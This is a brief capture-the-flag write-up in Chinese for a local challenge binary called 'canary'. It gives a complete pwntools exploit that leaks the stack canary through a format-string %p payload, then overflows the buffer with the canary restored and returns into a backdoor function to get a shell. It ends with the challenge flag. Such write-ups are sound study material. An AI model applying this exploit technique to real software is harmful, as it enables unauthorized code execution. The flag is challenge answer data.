1. IDA静态分析，格式化字符串泄露canary，溢出时在正确位置放入canary得到

exp：

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')
io = process('/home/kali/Desktop/canary')
backdoor = 0x401262

payload1 = b'aaaaaaaa%p%p%p%p%p%p%p%p%p%p%p'
io.sendafter(b"Give me some gift?",payload1)

canary = io.recvuntil(b"magic").decode(encoding='utf-8').split('0x')[-1]
canary = canary[:len(canary)-18:]
canary = '0x'+canary
canary = int(canary,16)

payload2 = b'a'*(0x30-8) + p64(canary)+ p64(0xdeadbeef)+p64(backdoor)
# io.sendafter(b'Show me your magic\n',payload2)
io.send(payload2)
io.interactive()
```

flag{cedcad54-d28f-4a7e-897a-7bbcc19cd54c}
